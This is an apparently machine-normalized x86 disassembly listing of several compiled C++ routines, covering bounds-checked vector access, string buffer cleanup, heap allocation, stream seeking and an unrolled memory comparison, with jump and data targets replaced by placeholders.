call sub_10017cc0
mov ecx [ ebp - 0x11c ]
mov esi [ ebp - 0x120 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x1
ja r-xdata
push r--data
call sub_100651be
lea eax [ esi + 0x1c ]
push eax
push ebx
lea eax [ ebp - 0x120 ]
call sub_100215e0
mov ecx [ ebp - 0x12c ]
push ecx
lea edx [ ebp - 0xd8 ]
push r--data
push edx
mov [ ebp - 0x128 ] eax
call sub_10003080
add esp 0xc
mov [ ebp - 0x4 ] 0x3
mov ecx [ ebp - 0x11c ]
mov esi [ ebp - 0x120 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x2
ja r-xdata
push r--data
call sub_100651be
lea eax [ esi + 0x38 ]
push eax
lea eax [ ebp - 0x120 ]
call sub_10003290
push eax
push ebx
lea edi [ ebp - 0xd8 ]
call sub_10017cc0
mov ecx [ ebp - 0x11c ]
mov esi [ ebp - 0x120 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
cmp ecx 0x2
ja r-xdata
push r--data
call sub_100651be
lea eax [ esi + 0x38 ]
push eax
push ebx
lea eax [ ebp - 0x120 ]
call sub_100215e0
push 0x227a9
lea esi [ ebp - 0x110 ]
mov [ ebp - 0x12c ] eax
call sub_10051c40
add esp 0x4
push eax
lea edx [ ebp - 0xa0 ]
push r--data
push edx
mov [ ebp - 0x4 ] 0x4
call sub_100282d0
add esp 0xc
mov [ ebp - 0x4 ] 0x6
cmp [ ebp - 0xfc ] 0x10
jb r-xdata
push r--data
call sub_100651be
mov ecx [ ebp - 0x11c ]
mov esi [ ebp - 0x120 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
mov [ ebp - 0xfc ] 0xf
mov [ ebp - 0x100 ] 0x0
mov [ ebp - 0x110 ] 0x0
cmp ecx 0x3
ja r-xdata
mov eax [ ebp - 0x110 ]
push eax
call sub_1000a86e
add esp 0x4
lea eax [ esi + 0x54 ]
push eax
lea eax [ ebp - 0x120 ]
call sub_10003290
push eax
push ebx
lea edi [ ebp - 0xa0 ]
call sub_10017cc0
mov ecx [ ebp - 0x11c ]
mov esi [ ebp - 0x120 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x3
ja r-xdata
push r--data
call sub_100651be
lea eax [ esi + 0x54 ]
push eax
push ebx
lea eax [ ebp - 0x120 ]
call sub_100215e0
mov ecx [ ebp - 0x130 ]
push ecx
lea edx [ ebp - 0x68 ]
push edx
mov [ ebp - 0x124 ] eax
call sub_10015820
mov esi eax
lea eax [ ebp - 0x84 ]
push eax
lea ecx [ ebp - 0x4c ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0x7
call sub_10003080
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x30 ]
mov [ ebp - 0x4 ] 0x8
call sub_10069410
mov ecx eax
mov [ ebp - 0x4 ] 0x9
mov esi [ ebp - 0x11c ]
mov edi [ ebp - 0x120 ]
sub esi edi
mov eax 0x92492493
imul esi
add edx esi
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
jne r-xdata
push r--data
call sub_100651be
push 0xffffffff
push 0x0
push ecx
mov ecx edi
call sub_10004e10
mov edi 0x10
cmp [ ebp - 0x1c ] edi
jb r-xdata
push r--data
call sub_100651be
mov esi 0xf
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x30 ] 0x0
cmp [ ebp - 0x38 ] edi
jb r-xdata
mov ecx [ ebp - 0x30 ]
push ecx
call sub_1000a86e
add esp 0x4
mov [ ebp - 0x4 ] 0x6
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x3c ] 0x0
mov [ ebp - 0x4c ] 0x0
cmp [ ebp - 0x54 ] edi
jb r-xdata
mov edx [ ebp - 0x4c ]
push edx
call sub_1000a86e
add esp 0x4
mov ecx [ ebp - 0x128 ]
push ecx
lea edx [ ebp - 0x68 ]
push edx
call sub_10015820
mov esi eax
lea eax [ ebp - 0xbc ]
push eax
lea ecx [ ebp - 0x30 ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0xa
call sub_10003080
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0xb
call sub_10069410
mov esi eax
mov [ ebp - 0x4 ] 0xc
mov ecx [ ebp - 0x11c ]
mov edi [ ebp - 0x120 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x1
ja r-xdata
mov eax [ ebp - 0x68 ]
push eax
call sub_1000a86e
add esp 0x4
push 0xffffffff
push 0x0
lea ecx [ edi + 0x1c ]
push esi
call sub_10004e10
mov esi 0x10
cmp [ ebp - 0x38 ] esi
jb r-xdata
push r--data
call sub_100651be
mov edi 0xf
mov [ ebp - 0x38 ] edi
mov [ ebp - 0x3c ] 0x0
mov [ ebp - 0x4c ] 0x0
cmp [ ebp - 0x1c ] esi
jb r-xdata
mov ecx [ ebp - 0x4c ]
push ecx
call sub_1000a86e
add esp 0x4
mov [ ebp - 0x4 ] 0x6
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x30 ] 0x0
cmp [ ebp - 0x54 ] esi
jb r-xdata
mov edx [ ebp - 0x30 ]
push edx
call sub_1000a86e
add esp 0x4
mov ecx [ ebp - 0x12c ]
push ecx
lea edx [ ebp - 0x68 ]
push edx
call sub_10015820
mov esi eax
lea eax [ ebp - 0xd8 ]
push eax
lea ecx [ ebp - 0x30 ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0xd
call sub_10003080
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0xe
call sub_10069410
mov esi eax
mov [ ebp - 0x4 ] 0xf
mov ecx [ ebp - 0x11c ]
mov edi [ ebp - 0x120 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x2
ja r-xdata
mov eax [ ebp - 0x68 ]
push eax
call sub_1000a86e
add esp 0x4
push 0xffffffff
push 0x0
lea ecx [ edi + 0x38 ]
push esi
call sub_10004e10
mov esi 0x10
cmp [ ebp - 0x38 ] esi
jb r-xdata
push r--data
call sub_100651be
mov edi 0xf
mov [ ebp - 0x38 ] edi
mov [ ebp - 0x3c ] 0x0
mov [ ebp - 0x4c ] 0x0
cmp [ ebp - 0x1c ] esi
jb r-xdata
mov ecx [ ebp - 0x4c ]
push ecx
call sub_1000a86e
add esp 0x4
mov [ ebp - 0x4 ] 0x6
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x30 ] 0x0
cmp [ ebp - 0x54 ] esi
jb r-xdata
mov edx [ ebp - 0x30 ]
push edx
call sub_1000a86e
add esp 0x4
mov ecx [ ebp - 0x124 ]
push ecx
lea edx [ ebp - 0x68 ]
push edx
call sub_10015820
mov esi eax
lea eax [ ebp - 0xa0 ]
push eax
lea ecx [ ebp - 0x30 ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0x10
call sub_10003080
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0x11
call sub_10069410
mov esi eax
mov [ ebp - 0x4 ] 0x12
mov ecx [ ebp - 0x11c ]
mov edi [ ebp - 0x120 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x3
ja r-xdata
mov eax [ ebp - 0x68 ]
push eax
call sub_1000a86e
add esp 0x4
push 0xffffffff
push 0x0
lea ecx [ edi + 0x54 ]
push esi
call sub_10004e10
mov esi 0x10
cmp [ ebp - 0x38 ] esi
jb r-xdata
push r--data
call sub_100651be
mov edi 0xf
mov [ ebp - 0x38 ] edi
mov [ ebp - 0x3c ] 0x0
mov [ ebp - 0x4c ] 0x0
cmp [ ebp - 0x1c ] esi
jb r-xdata
mov ecx [ ebp - 0x4c ]
push ecx
call sub_1000a86e
add esp 0x4
mov [ ebp - 0x4 ] 0x6
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x30 ] 0x0
cmp [ ebp - 0x54 ] esi
jb r-xdata
mov edx [ ebp - 0x30 ]
push edx
call sub_1000a86e
add esp 0x4
lea ecx [ ebp - 0xf4 ]
push ecx
lea edi [ ebp - 0x120 ]
call sub_1001e5a0
sub esp 0x1c
mov ecx esp
mov [ ebp - 0x4 ] 0x13
mov [ ebp - 0x124 ] esp
push 0xffffffff
xor esi esi
push esi
lea edx [ ebp - 0xf4 ]
mov edi 0xf
mov [ ecx + 0x14 ] edi
mov [ ecx + 0x10 ] esi
push edx
mov [ ecx ] 0x0
call sub_10037cf0
push esi
push ebx
call sub_1005c6a0
mov ebx 0x10
mov [ ebp - 0x124 ] eax
cmp [ ebp - 0xe0 ] ebx
jb r-xdata
mov eax [ ebp - 0x68 ]
push eax
call sub_1000a86e
add esp 0x4
mov [ ebp - 0xe0 ] edi
mov [ ebp - 0xe4 ] esi
mov [ ebp - 0xf4 ] 0x0
cmp [ ebp - 0x8c ] ebx
jb r-xdata
mov eax [ ebp - 0xf4 ]
push eax
call sub_1000a86e
add esp 0x4
mov [ ebp - 0x8c ] edi
mov [ ebp - 0x90 ] esi
mov [ ebp - 0xa0 ] 0x0
cmp [ ebp - 0xc4 ] ebx
jb r-xdata
mov ecx [ ebp - 0xa0 ]
push ecx
call sub_1000a86e
add esp 0x4
mov [ ebp - 0xc4 ] edi
mov [ ebp - 0xc8 ] esi
mov [ ebp - 0xd8 ] 0x0
cmp [ ebp - 0xa8 ] ebx
jb r-xdata
mov edx [ ebp - 0xd8 ]
push edx
call sub_1000a86e
add esp 0x4
mov [ ebp - 0xa8 ] edi
mov [ ebp - 0xac ] esi
mov [ ebp - 0xbc ] 0x0
cmp [ ebp - 0x70 ] ebx
jb r-xdata
mov eax [ ebp - 0xbc ]
push eax
call sub_1000a86e
add esp 0x4
mov eax [ ebp - 0x120 ]
mov [ ebp - 0x70 ] edi
mov [ ebp - 0x74 ] esi
mov [ ebp - 0x84 ] 0x0
cmp eax esi
je r-xdata
mov ecx [ ebp - 0x84 ]
push ecx
call sub_1000a86e
add esp 0x4
mov eax [ ebp - 0x124 ]
mov edx [ ebp - 0x124 ]
push edx
mov edx [ ebp - 0x11c ]
lea ecx [ ebp - 0x114 ]
push ecx
push edx
push eax
call sub_10072070
mov eax [ ebp - 0x120 ]
push eax
call sub_1000a86e
add esp 0x14
sub_1004c5a0
push ebp
mov ebp esp
push 0xffffffff
push sub_10084f6b
mov eax [ fs : 0x0 ]
push eax
sub esp 0x28
push ebx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x10 ] ebx
test eax eax
je r-xdata
mov eax 0x2
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ eax ] ebx
jne r-xdata
push 0x20
call sub_1002e3ac
mov esi eax
add esp 0x4
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] ebx
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_10025720
add eax 0x1c
mov eax ecx
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0xffffffff
mov [ ecx ] esi
test bl 0x1
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_10060250
push eax
mov ecx esi
mov ebx 0x1
mov [ esi + 0x4 ] 0x0
mov [ esi ] r--data
call sub_100168c0
jmp r-xdata
sub_1004c660
push ebp
mov ebp esp
sub esp 0x5c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push esi
push edi
lea edx [ ebp - 0x58 ]
mov edi ecx
mov [ ebp - 0x5c ] eax
mov eax [ ebx + 0x1c ]
push edx
mov [ ebp - 0x58 ] 0x0
mov ecx [ eax ]
push edi
push eax
mov eax [ ecx + 0x94 ]
call eax
test eax eax
jne r-xdata
lea edx [ ebp - 0x50 ]
mov eax 0xdd
call sub_1002f620
mov esi [ ebp - 0x58 ]
call sub_10006970
mov esi eax
mov eax [ ebp - 0x58 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
test esi esi
je r-xdata
mov ecx [ ebp - 0x5c ]
mov esi [ ecx ]
test esi esi
je r-xdata
mov eax 0x1
pop edi
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebx + 0x1c ]
lea edx [ ebp - 0x54 ]
push edx
mov [ ebp - 0x54 ] 0x0
mov ecx [ eax ]
push edi
push eax
mov eax [ ecx + 0x94 ]
call eax
test eax eax
je r-xdata
mov eax [ ebp - 0x54 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
xor eax eax
pop esi
call sub_10032529
mov esp ebp
pop ebp
retn 0x4
lea esp [ esp ]
mov edi [ esi ]
lea edx [ ebp - 0x54 ]
push edx
mov ecx ebx
call sub_1001b580
mov esi [ esi + 0x4 ]
test esi esi
jne r-xdata
sub_1004c733
push 0x34
mov eax sub_10085ad9
call sub_10047689
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x20 ]
mov edi ecx
mov [ ebp - 0x3c ] edi
add edi 0x8
push edi
mov [ ebp - 0x30 ] eax
mov eax [ ebp + 0x18 ]
push 0x0
push 0x30
mov [ ebp - 0x38 ] eax
call sub_10030ff0
add esp 0xc
cmp [ esi + 0x14 ] 0x8
movzx ebx ax
jb r-xdata
push edi
xor edi edi
push edi
push 0x2d
mov [ ebp - 0x34 ] 0x0
call sub_10030ff0
add esp 0xc
cmp [ esi ] ax
jne r-xdata
mov esi [ esi ]
movzx eax [ esi ]
cmp bx ax
ja r-xdata
mov [ ebp - 0x34 ] 0x1
add esi 0x2
push edi
push esi
lea ecx [ ebp - 0x2c ]
call sub_100301e0
and [ ebp - 0x4 ] 0x0
test edi edi
jne r-xdata
lea ecx [ ebx + 0x9 ]
sub esp 0x1c
lea eax [ ebp - 0x2c ]
mov ecx esp
mov [ ebp - 0x40 ] esp
push eax
call sub_1001f5e0
push [ ebp - 0x34 ]
mov ecx [ ebp - 0x3c ]
push [ ebp + 0x1c ]
push [ ebp - 0x38 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp - 0x30 ]
call sub_100087ba
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_1006d830
mov eax [ ebp - 0x30 ]
call sub_100262c3
retn 0x1c
push ebx
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10004190
inc edi
movzx eax [ esi + edi * 2 ]
cmp bx ax
jbe r-xdata
movzx eax ax
cmp eax ecx
jg r-xdata
sub_1004c810
cmp [ rw-data ] 0x8
jb r-xdata
push esi
xor ecx ecx
mov esi rw-data
mov [ rw-data ] 0x7
mov [ rw-data ] 0x0
mov [ rw-data ] cx
call sub_100476c0
mov esi 0x8
cmp [ rw-data ] esi
jb r-xdata
mov eax [ rw-data ]
push eax
call sub_1000a86e
add esp 0x4
xor eax eax
cmp [ rw-data ] esi
mov [ rw-data ] 0x7
mov [ rw-data ] 0x0
mov [ rw-data ] ax
pop esi
jb r-xdata
mov edx [ rw-data ]
push edx
call sub_1000a86e
add esp 0x4
xor edx edx
mov [ rw-data ] 0x7
mov [ rw-data ] 0x0
mov [ rw-data ] dx
retn
mov ecx [ rw-data ]
push ecx
call sub_1000a86e
add esp 0x4
sub_1004c8bd
mov edi edi
push ebp
mov ebp esp
xor eax eax
cmp [ ebp + 0xc ] eax
jbe r-xdata
pop ebp
retn
mov ecx [ ebp + 0x8 ]
inc eax
add ecx 0x2
cmp eax [ ebp + 0xc ]
jb r-xdata
cmp [ ecx ] 0x0
je r-xdata
sub_1004c900
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x14 ] 0x6
je r-xdata
mov ecx [ eax + 0x38 ]
mov [ esi ] ecx
mov eax [ eax + 0x3c ]
lea edx [ ebp - 0x28 ]
mov eax 0x68
call sub_1002f620
push 0x4
push 0x0
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
mov [ eax ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov [ esi + 0x4 ] eax
inc [ eax ]
xor ecx ebp
mov eax esi
call sub_10032529
mov esp ebp
pop ebp
retn 0x4
sub_1004c973
push 0x3c
mov eax sub_10085747
call sub_10047689
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov ebx [ ebp + 0x20 ]
mov edi [ ebp + 0x24 ]
and [ ebp - 0x34 ] 0x0
mov [ ebp - 0x3c ] eax
lea eax [ ebp - 0x38 ]
mov [ ebp - 0x44 ] ecx
push eax
mov ecx esi
call sub_10007a10
mov esi [ esi + 0x14 ]
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x34 ]
push ecx
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x44 ]
call sub_1006406d
add esp 0x18
push eax
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_1000fdf6
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x38 ]
mov esi eax
mov [ ebp - 0x44 ] edx
call sub_1002be90
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1002839c
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x40 ] eax
je r-xdata
or [ ebx ] 0x1
or [ ebx ] 0x2
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
mov eax [ ebp - 0x44 ]
mov [ edi ] esi
mov [ edi + 0x4 ] eax
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x3c ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_100262c3
retn 0x20
sub_1004ca30
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi + 0x10 ]
mov ecx [ ebp + 0x8 ]
push edi
cmp eax ecx
jae r-xdata
mov edi [ ebp + 0xc ]
sub eax ecx
cmp eax edi
jae r-xdata
push r--data
call sub_100651be
test edi edi
je r-xdata
mov edi eax
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
mov edx [ esi + 0x14 ]
push ebx
cmp edx 0x10
jb r-xdata
mov ebx esi
mov ebx [ esi ]
jmp r-xdata
mov edx esi
mov edx [ esi ]
jmp r-xdata
cmp edx 0x10
jb r-xdata
mov ecx esi
mov [ ecx + eax ] 0x0
mov ecx [ esi ]
mov [ ecx + eax ] 0x0
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
sub eax edi
add ebx ecx
push eax
add ebx edi
add edx ecx
push ebx
push edx
call sub_1007ec40
mov eax [ esi + 0x10 ]
add esp 0xc
sub eax edi
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] eax
pop ebx
jb r-xdata
sub_1004cac0
push ebp
mov ebp esp
push ecx
mov edx [ ecx + 0x24 ]
mov eax [ edx ]
test eax eax
je r-xdata
push ebx
mov bl [ ebp + 0x18 ]
push esi
push edi
test bl 0x1
je r-xdata
cmp [ ecx + 0x3c ] eax
jae r-xdata
test bl 0x2
je r-xdata
mov eax [ ecx + 0x20 ]
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
test eax eax
je r-xdata
mov [ ecx + 0x3c ] eax
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x10 ]
mov ecx esi
or ecx ebx
je r-xdata
mov eax [ edx ]
mov [ ebp + 0x18 ] eax
test eax eax
je r-xdata
mov edx [ ebp + 0x14 ]
cmp edx 0x2
jne r-xdata
mov eax [ ebp + 0x8 ]
pop edi
xor ecx ecx
mov [ eax ] esi
pop esi
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0x14
mov esi [ r--data ]
mov ebx [ r--data ]
mov edx [ ebp + 0x14 ]
cmp edx 0x2
jne r-xdata
cmp edx 0x1
jne r-xdata
mov edx [ ecx + 0x10 ]
mov eax [ ecx + 0x3c ]
sub eax [ edx ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x10 ]
cdq
add esi eax
adc ebx edx
jmp r-xdata
cmp edx 0x1
jne r-xdata
mov edx [ ecx + 0x10 ]
mov eax [ ecx + 0x3c ]
sub eax [ edx ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x10 ]
cdq
add esi eax
adc ebx edx
jmp r-xdata
test edx edx
je r-xdata
test bl 0x2
jne r-xdata
test ebx ebx
jl r-xdata
test edx edx
je r-xdata
mov edx [ ecx + 0x10 ]
sub eax [ edx ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x10 ]
cdq
add esi eax
adc ebx edx
jmp r-xdata
test ebx ebx
jl r-xdata
mov ebx [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov esi [ r--data ]
mov ebx [ r--data ]
jmp r-xdata
mov edx [ ecx + 0x10 ]
sub eax [ edx ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x10 ]
cdq
add esi eax
adc ebx edx
jmp r-xdata
jg r-xdata
mov ebx [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov esi [ r--data ]
mov ebx [ r--data ]
jmp r-xdata
jg r-xdata
mov eax [ ecx + 0x10 ]
mov edi [ eax ]
mov eax [ ecx + 0x3c ]
sub eax edi
cdq
cmp ebx edx
jg r-xdata
test esi esi
jb r-xdata
mov eax [ ecx + 0x10 ]
mov edi [ eax ]
mov eax [ ecx + 0x3c ]
sub eax edi
cdq
cmp ebx edx
jg r-xdata
test esi esi
jb r-xdata
jl r-xdata
jl r-xdata
sub edi [ ebp - 0x4 ]
mov eax [ ecx + 0x30 ]
add edi esi
sub [ eax ] edi
mov eax [ ecx + 0x20 ]
add [ eax ] edi
test [ ebp + 0x18 ] 0x2
je r-xdata
cmp esi eax
ja r-xdata
sub edi [ ebp + 0x18 ]
mov eax [ ecx + 0x34 ]
add edi esi
sub [ eax ] edi
mov ecx [ ecx + 0x24 ]
add [ ecx ] edi
jmp r-xdata
cmp esi eax
ja r-xdata
mov eax [ ecx + 0x24 ]
mov edi [ eax ]
test edi edi
je r-xdata
mov eax [ ecx + 0x34 ]
mov eax [ eax ]
mov edx [ ecx + 0x20 ]
mov edx [ edx ]
add eax edi
mov edi [ ecx + 0x24 ]
mov [ edi ] edx
mov ecx [ ecx + 0x34 ]
sub eax edx
mov [ ecx ] eax
jmp r-xdata
sub_1004cc80
mov eax [ edi ]
test eax eax
je r-xdata
push esi
push ebx
call [ lstrlenW@IAT ]
lea esi [ eax + eax ]
lea eax [ esi + 0x2 ]
push eax
push 0x40
call [ LocalAlloc@IAT ]
push esi
push ebx
push eax
mov [ edi ] eax
call sub_1007f580
add esp 0xc
pop esi
retn
push eax
call [ LocalFree@IAT ]
mov [ edi ] 0x0
sub_1004ccb9
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x10 ]
mov eax edi
sub eax 0x0
je r-xdata
xor eax eax
dec eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
movzx eax [ eax ]
movzx ecx [ ecx ]
jmp r-xdata
dec eax
je r-xdata
sub eax ecx
je r-xdata
mov ecx [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
movzx eax [ ecx ]
movzx edx [ esi ]
sub eax edx
je r-xdata
dec eax
je r-xdata
pop edi
pop esi
pop ebp
retn
xor ecx ecx
test eax eax
setg cl
lea eax [ ecx + ecx - 0x1 ]
jmp r-xdata
movzx eax [ ecx + 0x1 ]
movzx ecx [ esi + 0x1 ]
jmp r-xdata
xor edx edx
test eax eax
setg dl
lea eax [ edx + edx - 0x1 ]
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
movzx eax [ ecx ]
movzx edx [ esi ]
sub eax edx
je r-xdata
dec eax
je r-xdata
movzx eax [ ecx + 0x1 ]
movzx edx [ esi + 0x1 ]
sub eax edx
je r-xdata
xor edx edx
test eax eax
setg dl
lea eax [ edx + edx - 0x1 ]
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
movzx eax [ ecx ]
movzx edx [ esi ]
sub eax edx
je r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
push ebx
push 0x20
pop edx
jmp r-xdata
movzx eax [ ecx + 0x2 ]
movzx ecx [ esi + 0x2 ]
jmp r-xdata
xor edx edx
test eax eax
setg dl
lea eax [ edx + edx - 0x1 ]
test eax eax
jne r-xdata
movzx eax [ ecx + 0x1 ]
movzx edx [ esi + 0x1 ]
sub eax edx
je r-xdata
xor edx edx
test eax eax
setg dl
lea eax [ edx + edx - 0x1 ]
test eax eax
jne r-xdata
cmp edi edx
jae r-xdata
movzx eax [ ecx + 0x2 ]
movzx edx [ esi + 0x2 ]
sub eax edx
je r-xdata
xor edx edx
test eax eax
setg dl
lea eax [ edx + edx - 0x1 ]
test eax eax
jne r-xdata
mov esi [ eax ]
cmp esi [ ecx ]
je r-xdata
add eax edi
add ecx edi
cmp edi 0x1f
ja r-xdata
movzx eax [ ecx + 0x3 ]
movzx ecx [ esi + 0x3 ]
xor edx edx
test eax eax
setg dl
lea eax [ edx + edx - 0x1 ]
test eax eax
jne r-xdata
xor esi esi
movzx esi [ eax ]
movzx ebx [ ecx ]
sub esi ebx
je r-xdata
xor eax eax
jmp [ edi * 4 + jump_table_1004e18d ]
mov eax esi
jmp r-xdata
mov esi [ eax + 0x4 ]
cmp esi [ ecx + 0x4 ]
je r-xdata
movzx esi [ eax + 0x1 ]
movzx ebx [ ecx + 0x1 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
mov edx [ eax - 0x1c ]
cmp edx [ ecx - 0x1c ]
je r-xdata
mov edx [ eax - 0x18 ]
cmp edx [ ecx - 0x18 ]
je r-xdata
mov edx [ eax - 0x14 ]
cmp edx [ ecx - 0x14 ]
je r-xdata
mov edx [ eax - 0x10 ]
cmp edx [ ecx - 0x10 ]
je r-xdata
mov edx [ eax - 0xc ]
cmp edx [ ecx - 0xc ]
je r-xdata
mov edx [ eax - 0x8 ]
cmp edx [ ecx - 0x8 ]
je r-xdata
mov edx [ eax - 0x4 ]
cmp edx [ ecx - 0x4 ]
je r-xdata
mov edx [ eax - 0x1d ]
cmp edx [ ecx - 0x1d ]
je r-xdata
mov edx [ eax - 0x19 ]
cmp edx [ ecx - 0x19 ]
je r-xdata
mov edx [ eax - 0x15 ]
cmp edx [ ecx - 0x15 ]
je r-xdata
mov edx [ eax - 0x11 ]
cmp edx [ ecx - 0x11 ]
je r-xdata
mov edx [ eax - 0xd ]
cmp edx [ ecx - 0xd ]
je r-xdata
mov edx [ eax - 0x9 ]
cmp edx [ ecx - 0x9 ]
je r-xdata
mov edx [ eax - 0x5 ]
cmp edx [ ecx - 0x5 ]
je r-xdata
movzx ecx [ ecx - 0x1 ]
movzx eax [ eax - 0x1 ]
sub eax ecx
je r-xdata
mov edx [ eax - 0x1e ]
cmp edx [ ecx - 0x1e ]
je r-xdata
mov edx [ eax - 0x1a ]
cmp edx [ ecx - 0x1a ]
je r-xdata
mov edx [ eax - 0x16 ]
cmp edx [ ecx - 0x16 ]
je r-xdata
mov edx [ eax - 0x12 ]
cmp edx [ ecx - 0x12 ]
je r-xdata
mov edx [ eax - 0xe ]
cmp edx [ ecx - 0xe ]
je r-xdata
mov edx [ eax - 0xa ]
cmp edx [ ecx - 0xa ]
je r-xdata
mov edx [ eax - 0x6 ]
cmp edx [ ecx - 0x6 ]
je r-xdata
mov dx [ eax - 0x2 ]
cmp dx [ ecx - 0x2 ]
je r-xdata
mov edx [ eax - 0x1f ]
cmp edx [ ecx - 0x1f ]
je r-xdata
mov edx [ eax - 0x1b ]
cmp edx [ ecx - 0x1b ]
je r-xdata
mov edx [ eax - 0x17 ]
cmp edx [ ecx - 0x17 ]
je r-xdata
mov edx [ eax - 0x13 ]
cmp edx [ ecx - 0x13 ]
je r-xdata
mov edx [ eax - 0xf ]
cmp edx [ ecx - 0xf ]
je r-xdata
mov edx [ eax - 0xb ]
cmp edx [ ecx - 0xb ]
je r-xdata
